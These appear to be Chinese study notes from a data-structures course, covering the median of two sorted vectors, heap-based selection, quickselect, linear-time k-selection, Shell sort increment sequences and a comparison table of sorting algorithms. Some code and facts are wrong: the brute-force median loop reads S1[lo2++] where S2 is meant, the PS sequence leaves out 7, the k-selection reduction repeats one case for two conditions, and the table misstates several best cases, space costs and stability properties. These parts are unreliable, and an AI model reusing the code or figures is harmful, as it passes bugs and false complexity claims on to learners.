<p>当向量规模为奇数时，准众数必然就是众数，当n为偶数时，针对准众数的查找的一种简明的调整方法是：首先任选一个元素(比如末元素)，并在$O(n)$时间内甄别其是否为准众数。不妨设该元素不是准众数，于是只需将其忽略(原向量的有效长度降低至$n-1$，为奇数)，即可将在原向量中查找众数的问题转化为在$n-1$的向量中查找众数的问题。</p>
<blockquote>
<p>讨论中位数问题的另一简化版本，任给有序向量$S_1$和$S_2$，如何找出归并后有序向量的中位数</p>
</blockquote>
<p><strong>蛮力版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 中位数算法蛮力版：效率低，仅适用于max(n1, n2)较小的情况</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//子向量S1[lo1, lo1 + n1)和S2[lo2, lo2 + n2)分别有序，数据项可能重复</span></span><br><span class="line"><span class="function">T <span class="title">trivialMedian</span> <span class="params">( Vector&lt;T&gt;&amp; S1, <span class="keyword">int</span> lo1, <span class="keyword">int</span> n1, Vector&lt;T&gt;&amp; S2, <span class="keyword">int</span> lo2, <span class="keyword">int</span> n2 )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> hi1 = lo1 + n1, hi2 = lo2 + n2;</span><br><span class="line">   Vector&lt;T&gt; S; <span class="comment">//将两个有序子向量归并为一个有序向量</span></span><br><span class="line">   <span class="keyword">while</span> ( ( lo1 &lt; hi1 ) &amp;&amp; ( lo2 &lt; hi2 ) ) &#123;</span><br><span class="line">      <span class="keyword">while</span> ( ( lo1 &lt; hi1 ) &amp;&amp; S1[lo1] &lt;= S2[lo2] ) S.insert ( S1[lo1 ++] );</span><br><span class="line">      <span class="keyword">while</span> ( ( lo2 &lt; hi2 ) &amp;&amp; S2[lo2] &lt;= S1[lo1] ) S.insert ( S2[lo2 ++] );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span> ( lo1 &lt; hi1 ) S.insert ( S1[lo1 ++] );</span><br><span class="line">   <span class="keyword">while</span> ( lo2 &lt; hi2 ) S.insert ( S1[lo2 ++] ); <span class="comment">/*DSA*/</span>print ( S );</span><br><span class="line">   <span class="keyword">return</span> S[ ( n1 + n2 ) / <span class="number">2</span>]; <span class="comment">//直接返回归并向量的中位数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若调用蛮力算法将二者归并，则需花费$O(n_1+n_2)$时间。</p>
<p>实际上，上述算法只需$O((n_1+n_2)/2)$步即可终止。计算的目标是归并之后向量的中位数，并不意味着一定要显式地完成合并。实际上就此计算任务而言，只需设置一个计数器，而不必真地引入并维护一个向量结构。具体地，依然可以沿用原算法的主体流程，向量$S$只是假想式地存在。无需真正地将子向量中地元素转移至S中，只需动态地记录这一向量地规模：每当有一个元素假想式地归入其中，则计数器相应地递增。一旦计数器抵达$\lfloor (n_1+n_2)/2$,即可忽略后续元素并立即假想地归入其中，则计数器相应地递增。</p>
<p><strong>减而治之</strong></p>
<p>假设两子向量等长，长度均为$n$</p>
<p><img src="https://i.loli.net/2019/09/12/aGZR7xAysMHPbm9.png"></p>
<p>简而治之的原理为，两子向量归并后所得的向量$S$长度为$2n$，则中位数对应的秩为$\lfloor 2n/2 \rfloor=n$，即存在$n$个元素不大于中位数，$n-1$个元素不小于中位数。若$m_1&lt;m_2$,则在$S_2$中存在$\lceil n/2 \rceil$个数大于$m_2$，假设其中一数为$m$，可能不小于$m$的数的个数最大为$\lfloor n/2 \rfloor+\lceil n/2 \rceil -1=n-1$ ,即$m$的后继个数和在$S_2$中可能大于$m$的数的个数。因为$m$在$m_2$右侧,所以后继个数必然小于$\lfloor n/2 \rfloor$ 个，所以必然不是$S$的中位数，或者与$m_1$或$m_2$同为$S$的中位数。</p>
<p>同时，在$S_1$和$ S_2$减去的不小于中位数的数和不大于中位数的个数相等，所以在减去前后两个子向量所对应的中位数不变。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//序列S1[lo1, lo1 + n)和S2[lo2, lo2 + n)分别有序，n &gt; 0，数据项可能重复</span></span><br><span class="line"><span class="function">T <span class="title">median</span> <span class="params">( Vector&lt;T&gt;&amp; S1, <span class="keyword">int</span> lo1, Vector&lt;T&gt;&amp; S2, <span class="keyword">int</span> lo2, <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//中位数算法（高效版）</span></span><br><span class="line">   <span class="keyword">if</span> ( n &lt; <span class="number">3</span> ) <span class="keyword">return</span> trivialMedian ( S1, lo1, n, S2, lo2, n ); <span class="comment">//递归基</span></span><br><span class="line">   <span class="keyword">int</span> mi1 = lo1 + n / <span class="number">2</span>, mi2 = lo2 + ( n - <span class="number">1</span> ) / <span class="number">2</span>; <span class="comment">//长度（接近）减半</span></span><br><span class="line">   <span class="keyword">if</span> ( S1[mi1] &lt; S2[mi2] )</span><br><span class="line">      <span class="keyword">return</span> median ( S1, mi1, S2, lo2, n + lo1 - mi1 ); <span class="comment">//取S1右半、S2左半</span></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> ( S1[mi1] &gt; S2[mi2] )</span><br><span class="line">      <span class="keyword">return</span> median ( S1, lo1, S2, mi2, n + lo2 - mi2 ); <span class="comment">//取S1左半、S2右半</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> S1[mi1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>推广至一般情况，则</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//向量S1[lo1, lo1 + n1)和S2[lo2, lo2 + n2)分别有序，数据项可能重复</span></span><br><span class="line"><span class="function">T <span class="title">median</span> <span class="params">( Vector&lt;T&gt;&amp; S1, <span class="keyword">int</span> lo1, <span class="keyword">int</span> n1, Vector&lt;T&gt;&amp; S2, <span class="keyword">int</span> lo2, <span class="keyword">int</span> n2 )</span> </span>&#123; <span class="comment">//中位数算法</span></span><br><span class="line">   <span class="keyword">if</span> ( n1 &gt; n2 ) <span class="keyword">return</span> median ( S2, lo2, n2, S1, lo1, n1 ); <span class="comment">//确保n1 &lt;= n2</span></span><br><span class="line">   <span class="keyword">if</span> ( n2 &lt; <span class="number">6</span> ) <span class="comment">//递归基：1 &lt;= n1 &lt;= n2 &lt;= 5</span></span><br><span class="line">      <span class="keyword">return</span> trivialMedian ( S1, lo1, n1, S2, lo2, n2 );</span><br><span class="line">   <span class="comment">///////////////////////////////////////////////////////////////////////</span></span><br><span class="line">   <span class="comment">//                lo1            lo1 + n1/2      lo1 + n1 - 1</span></span><br><span class="line">   <span class="comment">//                 |                 |                 |</span></span><br><span class="line">   <span class="comment">//                 X &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; X &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; X</span></span><br><span class="line">   <span class="comment">// Y .. trimmed .. Y &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Y &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Y .. trimmed .. Y</span></span><br><span class="line">   <span class="comment">// |               |                 |                 |               |</span></span><br><span class="line">   <span class="comment">// lo2     lo2 + (n2-n1)/2       lo2 + n2/2     lo2 + (n2+n1)/2    lo2 + n2 -1</span></span><br><span class="line">   <span class="comment">///////////////////////////////////////////////////////////////////////</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">2</span> * n1 &lt; n2 ) <span class="comment">//若两个向量的长度相差悬殊，则长者（S2）的两翼可直接截除</span></span><br><span class="line">      <span class="keyword">return</span> median ( S1, lo1, n1, S2, lo2 + ( n2 - n1 - <span class="number">1</span> ) / <span class="number">2</span>, n1 + <span class="number">2</span> - ( n2 - n1 ) % <span class="number">2</span> );</span><br><span class="line">   <span class="comment">///////////////////////////////////////////////////////////////////////</span></span><br><span class="line">   <span class="comment">//    lo1                  lo1 + n1/2              lo1 + n1 - 1</span></span><br><span class="line">   <span class="comment">//     |                       |                       |</span></span><br><span class="line">   <span class="comment">//     X &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; X &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; X</span></span><br><span class="line">   <span class="comment">//                             |</span></span><br><span class="line">   <span class="comment">//                            m1</span></span><br><span class="line">   <span class="comment">///////////////////////////////////////////////////////////////////////</span></span><br><span class="line">   <span class="comment">//                            mi2b</span></span><br><span class="line">   <span class="comment">//                             |</span></span><br><span class="line">   <span class="comment">// lo2 + n2 - 1         lo2 + n2 - 1 - n1/2</span></span><br><span class="line">   <span class="comment">//     |                       |</span></span><br><span class="line">   <span class="comment">//     Y &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Y ...</span></span><br><span class="line">   <span class="comment">//                                .</span></span><br><span class="line">   <span class="comment">//                               .</span></span><br><span class="line">   <span class="comment">//                              .</span></span><br><span class="line">   <span class="comment">//                             .</span></span><br><span class="line">   <span class="comment">//                            .</span></span><br><span class="line">   <span class="comment">//                           .</span></span><br><span class="line">   <span class="comment">//                          .</span></span><br><span class="line">   <span class="comment">//                         ... Y &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Y</span></span><br><span class="line">   <span class="comment">//                             |                       |</span></span><br><span class="line">   <span class="comment">//                       lo2 + (n1-1)/2               lo2</span></span><br><span class="line">   <span class="comment">//                             |</span></span><br><span class="line">   <span class="comment">//                            mi2a</span></span><br><span class="line">   <span class="comment">///////////////////////////////////////////////////////////////////////</span></span><br><span class="line">   <span class="keyword">int</span> mi1  = lo1 + n1 / <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">int</span> mi2a = lo2 + ( n1 - <span class="number">1</span> ) / <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">int</span> mi2b = lo2 + n2 - <span class="number">1</span> - n1 / <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">if</span> ( S1[mi1] &gt; S2[mi2b] ) <span class="comment">//取S1左半、S2右半</span></span><br><span class="line">      <span class="keyword">return</span> median ( S1, lo1, n1 / <span class="number">2</span> + <span class="number">1</span>, S2, mi2a, n2 - ( n1 - <span class="number">1</span> ) / <span class="number">2</span> );</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> ( S1[mi1] &lt; S2[mi2a] ) <span class="comment">//取S1右半、S2左半</span></span><br><span class="line">      <span class="keyword">return</span> median ( S1, mi1, ( n1 + <span class="number">1</span> ) / <span class="number">2</span>, S2, lo2, n2 - n1 / <span class="number">2</span> );</span><br><span class="line">   <span class="keyword">else</span> <span class="comment">//S1保留，S2左右同时缩短</span></span><br><span class="line">      <span class="keyword">return</span> median ( S1, lo1, n1, S2, mi2a, n2 - ( n1 - <span class="number">1</span> ) / <span class="number">2</span> * <span class="number">2</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该算法首先比较$n_1$和$n_2$的大小，并在必要时交换两个子向量，从而保证有$n_1&lt;n_2$。</p>
<p>若两个向量相差悬殊，则可对称地适当截短长者的两翼，以保证有：</p>
<p>$n_1\leq n_2 \leq 2n_1$</p>
<p>因为$S_2$两翼截除的长度相等，所以此后$S_1 \cup S_2$的中位数，依然是$S_1\cup S_2$的中位数。</p>
<p>这里采用了简而治之的策略，可使问题规模按照几何级数递减，故总体复杂度应为$O(log(min(n_1,n_2)))$ 。无论是交换两个向量，还是截短$S_2$,都只需常数时间。因此实质的计算，只是针对长度均同阶于$min(n_1,n_2)$的一对向量计算中位数。此后每做一次比较，即可将问题的规模缩减至原来的一半。因此，问题的规模将以1/2为比例按几何级数的速度递减，直至平凡的递归基。整个算法的递归深度不超过$log_2{min(n_1,n_2)}$,总体时间复杂度为$O(log(min(n_1,n_2)))$。</p>
<p>若输入的有序序列$S_1$和$S_2$以列表的形式实现而不是向量，则在读取每个元素之前都要沿着列表进行计数查找。为保证$|S_1|&lt;|S_2|$而交换两个序列，依然只需$ O(1)$时间，然而序列$S_2$两翼的截短则大致需要$O(n_2-n_1)$时间。而更重要的是，在此后的递归过程中，每一次为将问题规模缩减一半，都必须花费线性的时间，总体需要$O(n_1+n_2)$时间，这一效率减低到和蛮力算法相同。</p>
<blockquote>
<p>为median()算法添加整型输入参数$k$，实现在$S_1\cup S_2$选取第$k$个元素的功能</p>
</blockquote>
<p>记$n_1=|S_1|$和$n_2=|S_2|$,不失一般性的，设$n_1\leq  n_2$</p>
<p>不妨设$2k \leq n_1+n_2$,否则，可以颠倒比较器的方向，原问题转化为在$S_1 \cup S_2$中选取第$n_1+n_2-k$个元素，与以下方法同理。</p>
<p>若$k\leq n_1=min(n_1,n_2)$,则只需令：</p>
<p>$S_1’=S_1[0,k)$</p>
<p>$S_2’=S_2[0,k)$</p>
<p>于是原问题即转化为计算$S_1’\cup S_2’$的中位数。</p>
<p>否则，若$n_1&lt;k&lt;n_2$,则可令</p>
<p>$S_1’=S_1[0,k)$</p>
<p>$S_2’=S_2[0,k)$</p>
<p>于是原问题即转化为计算$S_1’\cup S_2’$的中位数。</p>
<p>可见，无论如何，针对$S_1 \cup S_2$的$k$选取问题总是可在常数时间内转化为中位数问题，并调用相关的算法。</p>
<p>一般性的选取问题中，蛮力算法效率之所以低下是因为一组元素中第$k$大元素包含的信息量远远小于经过全排序后所得到的整个有序序列。花费足以得到全排序的计算成本，却仅得到了少量的局部信息。</p>
<h2 id="堆选取"><a href="#堆选取" class="headerlink" title="堆选取"></a>堆选取</h2><p>基于堆结构的选取算法大致有以下几种：</p>
<p>首先花费$O(n)$时间将全体元素组织为一个小顶堆，然后经过$k$次delMin()操作，则得到位序为k的元素，这一算法的时间为：</p>
<p>$O(n)+kO(logn)=O(n+klogn)$</p>
<p>另一算法为，任取k个元素，并在$O(k)$时间内组织为一个大顶堆，然后将剩余n-k个元素插入其中，每插入一个，随即删除堆顶，以使堆的规模恢复为k,待所有元素处理完毕后，堆顶即为目标元素。该算法的运行时间为：</p>
<p>$O(k)+2(n-k)O(logk)=O(k+2(n-k)logk)$</p>
<p>最后一种方法为，分别构建一个规模为$n-k$ 的小顶堆G和$k$的大顶堆H。接下来，反复比较它们的堆顶g和h，只要g小于h，则将二者交换，并重新调整为两个堆。如此，G的堆顶G将持续增大，H的堆顶将持续减小。当$g\geq h$时，h即为所要找的元素。这一算法的运行时间为：</p>
<p>$O(n-k)+O(k)+min(k,n-k)2log((O(log k+log(n-k))))$</p>
<p>在目标元素的秩很小或很大的时候($|n/2-k| \approx n/2$)，以上算法的性能都还不错。比如$k=0$时，上述两算法均只需线性时间，当$k \approx n/2$，以上算法的复杂度均退化为蛮力算法的$O(nlogn)$。</p>
<h2 id="快速划分"><a href="#快速划分" class="headerlink" title="快速划分"></a>快速划分</h2><p>选取问题所查找的位序$k$,就是其在对应的有序序列中的秩，就这一性质而言，与轴点颇为相似。可反复应用这一点，逐步逼近目标$k$。</p>
<p>首先，调用<code>partition()</code>构造向量$A[i]=x$，若$i=k$，则该轴点恰好就是待选取的目标元素，即可直接返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">void</span> <span class="title">quickSelect</span> <span class="params">( Vector&lt;T&gt; &amp; A, Rank k )</span> </span>&#123; <span class="comment">//基于快速划分的k选取算法</span></span><br><span class="line">   <span class="keyword">for</span> ( Rank lo = <span class="number">0</span>, hi = A.size() - <span class="number">1</span>; lo &lt; hi; ) &#123;</span><br><span class="line">      Rank i = lo, j = hi; T pivot = A[lo];</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; j ) &#123; <span class="comment">//O(hi - lo + 1) = O(n)</span></span><br><span class="line">         <span class="keyword">while</span> ( ( i &lt; j ) &amp;&amp; ( pivot &lt;= A[j] ) ) j--; A[i] = A[j];</span><br><span class="line">         <span class="keyword">while</span> ( ( i &lt; j ) &amp;&amp; ( A[i] &lt;= pivot ) ) i++; A[j] = A[i];</span><br><span class="line">      &#125; <span class="comment">//assert: i == j</span></span><br><span class="line">      A[i] = pivot;</span><br><span class="line">      <span class="keyword">if</span> ( k &lt;= i ) hi = i - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt;= k ) lo = i + <span class="number">1</span>;</span><br><span class="line">   &#125; <span class="comment">//A[k] is now a pivot</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若$i$不等于$k$，则无非两种情况。</p>
<ul>
<li>$k&lt;i$,则选取的目标元素不可能来自处于$x$右侧、不小于$x$的子向量，此时不妨将该子向量剪除，然后递归地在剩余区间做k选取</li>
<li>若$i&gt;k$,则选取的目标元素不可能来自处于$x$左侧、不大于$x$的子向量中，同样可以将子向量剪除，然后递归地在剩余区间做$k-i$选取。</li>
</ul>
<p>该算法流程与轴点构造算法类似，每经过一步主迭代，都会构造出一个轴点$A[i]$，然后$lo$和$hi$将彼此靠拢，查找范围将收缩至$A[i]$的某一侧。当轴点的秩$k$恰好为$k$时，算法随即终止。尽管内循环仅需$O(hi-lo+1)$时间，但是在最坏情况下需执行$\Omega(n)$次，总体运行时间为$O(n^2)$。平均时间复杂度为$O(n)$。</p>
<p>$T(n)=(n+1)+\frac{1}{n} \sum_{k=0}^{n} T(max(k,n-k)) =O(n)$</p>
<h2 id="k选取算法"><a href="#k选取算法" class="headerlink" title="k选取算法"></a>k选取算法</h2><p>$k$选取算法的主要流程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select(A,k)</span><br><span class="line">输入：规模为n的无序序列A,秩k&gt;&#x3D;0</span><br><span class="line">输出：A所对应的有序序列中秩为k的元素</span><br><span class="line">&#123;</span><br><span class="line">      0)if(n&#x3D;|A|&lt;Q) return trivialSelect(A,k);</span><br><span class="line">      1)将A均匀地划分为n&#x2F;Q个子序列，各含Q个元素</span><br><span class="line">      2)各子序列分别排序，计算中位数，并将这些中位数组成一个序列</span><br><span class="line">      3)通过递归调用select()，计算中位数序列的中位数，记作M</span><br><span class="line">      4)根据其相对于M的大小，将A中元素分为三个子集：L(小于)M(等于)和G(大于)</span><br><span class="line">      5)if(|L|&gt;k) return select(L,k);</span><br><span class="line">      else if (|L|+|E|&gt;&#x3D;K) return M;</span><br><span class="line">      else return select(G,k-|L|-|E|);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将以上算法运行时间记作$T(n)$，则</p>
<ul>
<li>第0步：$O(1)=O(QlogQ)$</li>
<li>第1步：$O(n)$ 子序列划分</li>
<li>第2步：$O(n)=Q^2n/Q$ 子序列各自排序，并找到中位数</li>
<li>第3步：$T(n/Q)$ 从$n/Q$个中位数中递归地找到全局中位数</li>
<li>第4步：$O(n)$,划分子集L/E/G，并分别计数</li>
<li>第5步：$T(3n/4)$</li>
</ul>
<p><strong>复杂度</strong></p>
<p><img src="https://i.loli.net/2019/09/12/alQEFLN8biB7W6p.png"></p>
<p>$T(n)=O(n)+T(n/Q)+T(3n/4)$</p>
<p>为了使解为线性函数，只需保证：</p>
<p>$n/Q+3n/4&lt;n$</p>
<p>若取$Q=5$,则存在常数$c$，使得</p>
<p>$T(n)=cn+T(n/5)+T(3n/4)$</p>
<p>$T(n)=O(20cn)=O(n)$</p>
<h1 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h1><p>希尔排序将整个序列视为一个矩阵，逐列各自排序。</p>
<p><strong>递减增量</strong></p>
<p>由粗到细：重新排列矩阵，使其更窄，再次逐列排序</p>
<p>逐步求精：如此往复，直至矩阵为一列</p>
<p>若原一维向量宽度为$A[0,n)$，则对于任一固定的矩阵宽度$w$,$A$和$B$中元素总有一一对应关系：$B[i] [j]=A[iw+j]$,从秩的角度来看，矩阵$B$的各列依次对应于关于宽度$w$的一个同余类。不妨假设$w$整除$n$，则矩阵宽度$w$自上而下对应于$A$中以$w$为间隔的$n/w$个元素，因此，矩阵的宽度$w$亦称作增量。</p>
<p>希尔排序的流程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Shellsort(A,n)</span><br><span class="line">输入：规模为n的无序向量A</span><br><span class="line">输出：A对应的有序向量</span><br><span class="line">&#123;</span><br><span class="line">   取一个递增的增量序列：H&#x3D;&#123;W1&#x3D;1,W2,23,..,2K,..&#125;</span><br><span class="line">   设置k&#x3D;max&#123;i|Wi&lt;n&#125;,即Wk为增量中小于n的最后一项</span><br><span class="line">   for(t&#x3D;k;t&gt;0;t--)&#123;</span><br><span class="line">       将向量A视为Wt为宽度的矩阵Bt</span><br><span class="line">       对Bt的每一列分别排序，Bt[i]，i&#x3D;0,1,..,Wt-1</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 其中各列内部排序如何实现？</p>
<p>必须采用输入敏感的算法，以保证有序性持续改善，且总体成本足够低廉。比如，插入排序，更多地取决于输入序列所含逆序对的总数。</p>
<p>希尔排序的总体效率取决于具体使用何种步长序列</p>
<p>主要考查和评测</p>
<ul>
<li>比较操作、移动操作的次数</li>
<li>收敛的速度，或者反过来，迭代的轮数</li>
</ul>
<h2 id="希尔序列"><a href="#希尔序列" class="headerlink" title="希尔序列"></a>希尔序列</h2><p><img src="https://i.loli.net/2019/09/12/TyKi1xRD3hftNuv.png"></p>
<h2 id="邮资问题"><a href="#邮资问题" class="headerlink" title="邮资问题"></a>邮资问题</h2><p>考查以下问题：</p>
<p>假设在某个国家，邮局仅发行面值为4分和13分的两种邮票，那么</p>
<ol>
<li>可否用这两种邮票组合出对应的50分邮资</li>
<li>可否用这两种邮票组合出对应的35分邮资</li>
</ol>
<p><strong>线性组合</strong></p>
<p>用数论的语言，以上问题可描述为：$4m+13n=35$是否存在自然数解？</p>
<p>对于任意自然数$g$和$h$,只要$m$和$n$也是自然数，则$f=mg+nh$都称作$g$和$h$的一个线性组合，我们称不可由$g$和$h$组合出来的最大自然数记作$x(g,h)$</p>
<p>如果$g$和$h$互素，则必有：</p>
<p>$x(g,h)=(g-1)(h-1)-1=gh-g-h$</p>
<p>$g=4$和$h=13$互素，故有$x(4,13)=35$，$35$恰好为无法由$4$和$13$组成的最大自然数。</p>
<p><strong>h有序和h排序</strong></p>
<p>在向量$S[0,n)$中，若$S[i]&lt;=S[i+h]$对于任何$0\leq i&lt;n-h$成立，则称该向量$h$有序，也就是说，其中相距$h$个单元的每队元素之间均有序。</p>
<p>考查希尔排序中对应于任一增量$h$的迭代，等同于在原向量之间以$h$间隔排序，故这一过程称为$h$排序，经$h$排序之后的向量必然$h$有序。</p>
<p>已经$g$有序的向量，再经过$h$排序后，依然保持$g$有序。考查$(g,h)$有序的任一向量，借助有序性的传递律可知，相距$g+h$的任何一对元素必然有序，故$S$必然$g+h$有序。推而广之，对于任何非负整数$m$和$n$,相距$mg+nh$的任何一对元素都必有序，故$S$必然$mg+nh$有序。</p>
<p><strong>有序性的保持和加强</strong></p>
<p>在分别做过$g$排序和$h$排序之后，该向量必定$g+h$有序。对于$g$和$h$的任一线性组合，该向量也应$mg+nh$有序，因此反过来，逆序对之间的间距绝不可能是$g$和$h$的组合。只要$g$和$h$互素，逆序对的间距就绝不可能大于$(g-1)(h-1)$。</p>
<p>希尔排序过程中向量的有序性之所以会不断改善，其原因为向量中每个元素所能参与构成的逆序对持续减少。于此同时，底层所采用的插入排序算法的实际执行时间将不断减少。</p>
<p>若某向量S已属于$(g,h)$有序，假设$g$和$h$的数量级均处于$O(d)$数量级。以下考查对该向量做$d$排序所需的时间。</p>
<p>根据定义，$d$排序将$S$等间距地划分为长度各为$O(n/d)$的$d$个子向量，并分别排序，在$(g,h)$有序的向量中，逆序对的间距不超过$(g-1)(h-1)/d=O(d)$ 。</p>
<p>于是，再次根据插入排序的结论，插入排序可在$O(d)O(n/d)=O(n)$时间内完成每一子向量的排序，所有子向量的排序应该不超过$O(dn)$。</p>
<h2 id="PS序列"><a href="#PS序列" class="headerlink" title="PS序列"></a>PS序列</h2><p>$H_{PS}=H_{shell}-1={2^k-1|k \in N}={1,3,15,31,63,127,255}$</p>
<p>其中相邻两项的确互素，采用这一序列，希尔排序的算法可达到$O(n^{3/2})$ ，其中$n$为待排序向量的规模。</p>
<p>在PS序列中，设$W_t$为其中$n^{1/2}$ 最接近者，亦即是$W_t=\Theta(n^{1/2})$ 。以下将希尔排序过程中所有的迭代分为两类，分别估计其运行时间。</p>
<p>首先，考查在$W_t$之前执行的各步迭代。</p>
<p>此类迭代所对应的增量均满足$W_k&gt;W_t$。在每一次这类迭代中，矩阵共有$W_k$列，各列包含$O(n/W_k)$个元素。因此，若采用插入排序算法，各列耗时$O((n/W_k)^2)$ ,所有列共计$O(n^2/W_k)$。于是，此类迭代各自所需的时间$O(n^2/(W_k))$构成一个以大致以2为比例的等比级数，其总和应线性正比于其中最大的一项，亦即不超过$O(2n^2/W_t)=O(n^{3/2})$。</p>
<p>对称地，再来考查$W_t$之后的各步迭代，</p>
<p>这类迭代所对应的增量均满足$W_k&lt;W_t$ ,考虑到此前刚完成$W_{k+1}$排序和$W_{k+2}$排序，来自PS序列的$W_{k+1}$和$W_{k+2}$互素，且与$W_{k}$同处一个数量级，根据之前的结论，每一次这样的迭代至多需要$O(nW_{k})$时间。同样地，这类迭代所需的时间$O(nW_{k})$同样构成一个大致以2为比例的等比级数，其总和也应线性正比于其中最大的一项，亦即不超过$O(2nW_{t})=O(n^{3/2})$。</p>
<h2 id="Pratt序列"><a href="#Pratt序列" class="headerlink" title="Pratt序列"></a>Pratt序列</h2><p>$H_{pratt}={2^p3^q|p,q\in N}={1,2,3,4,8,9,12,36,…}$</p>
<p>采取pratt序列，希尔序列算法至多运行$O(nlog^2n)$时间</p>
<p>在$(2,3)$有序的序列中，逆序元素之间的间距不超过$(2-1)(3-1)-1=1$。</p>
<p>整个向量的逆序对不超过$O(n)$个，对该向量的$1$排序仅需$ O(n)$时间。</p>
<p>对于pratt序列，若S已是$(2h_k,3h_k)$有序，故若按照相对于$h_k$的模余值，可以划分为$h_k$个同余类；相应地，原整个向量可拆分为$h_k$个等长的子向量。其中每个元素都是$(2,3)$有序的，根据以上结论，可在线性时间内转化为$1$有序的，总体效果而言，等同于在$O(n)$时间内转化为全局的$h_k$有序。</p>
<p>pratt序列中大于$n$的项数至多不超过$log_2nlog_3n=o(log^2n)$。</p>
<h2 id="Sedgewick序列"><a href="#Sedgewick序列" class="headerlink" title="Sedgewick序列"></a>Sedgewick序列</h2><p>Pratt序列效率比较高，但因其中各项的间距太小，会导致迭代趟数过多，为此，Sedgewick提出了以下增量序列：</p>
<p>${1,5,19,41,109,209,505,929,2161,3905,8929,…}$</p>
<p>其中各项均为$9<em>4^k-9</em>2^k+1$的形式，如此改进之后，希尔排序算法在最坏情况下的复杂度为$n^{4/3}$,平均复杂度为$O(n^{7/6})$。更重要的是，在通常应用环境中，这一增量序列的综合效率最佳。</p>
<table>
<thead>
<tr>
<th>排序方法</th>
<th>最坏时间复杂度</th>
<th>最好时间复杂度</th>
<th>空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>冒泡排序</td>
<td>$O( n^2)$</td>
<td>$ O(n)$</td>
<td>$ O(1)$</td>
<td>输入敏感，稳定</td>
</tr>
<tr>
<td>插入排序</td>
<td>$O( n^2)$</td>
<td>$ O(n^2)$</td>
<td>$ O(1) $</td>
<td>输入敏感，稳定</td>
</tr>
<tr>
<td>选择排序</td>
<td>$o(n^2)$</td>
<td>$ O(n^2) $</td>
<td>$ O(1) $</td>
<td>输入不敏感，稳定</td>
</tr>
<tr>
<td>归并排序</td>
<td>$O( nlogn)$</td>
<td>$O( nlogn)$</td>
<td>$ O(1)$</td>
<td>输入不敏感，稳定</td>
</tr>
<tr>
<td>快速排序</td>
<td>$O( n^2)$</td>
<td>$O (nlogn) $</td>
<td>$ O(1)$</td>
<td>输入不敏感，不稳定</td>
</tr>
<tr>
<td>桶排序</td>
<td>$ O(n+M)$</td>
<td>$ O(n+M)$</td>
<td>$ O(n+M)$</td>
<td>输入不敏感，稳定</td>
</tr>
<tr>
<td>基数排序</td>
<td>$O(t(n+M))$</td>
<td>$ O(t(n+M))$</td>
<td>$O(M)$</td>
<td>输入不敏感，稳定</td>
</tr>
<tr>
<td>计数排序</td>
<td>$ O(n) $</td>
<td>$ O(M) $</td>
<td>$ O(M)$</td>
<td>输入不敏感，稳定</td>
</tr>
<tr>
<td>锦标赛排序</td>
<td>$O( nlogn )$</td>
<td>$O( nlogn )$</td>
<td>$ O(n) $</td>
<td>输入不敏感，稳定</td>
</tr>
<tr>
<td>就地堆排序</td>
<td>$O( nlogn )$</td>
<td>$O( nlogn )$</td>
<td>$ O(1)$</td>
<td>输入不敏感，不稳定</td>
</tr>
<tr>
<td>shell排序</td>
<td>不详</td>
<td>不详</td>
<td>$ O( 1) $</td>
<td>底层排序算法为输入敏感算法</td>
</tr>
</tbody></table>
<p>以上不稳定的算法均可通过合成数的方法转换为稳定的算法，转换需要$ O(n) $时间，以上复杂度不低于$O(n)$的算法复杂度仍与之前一致。</p>
]]></content>
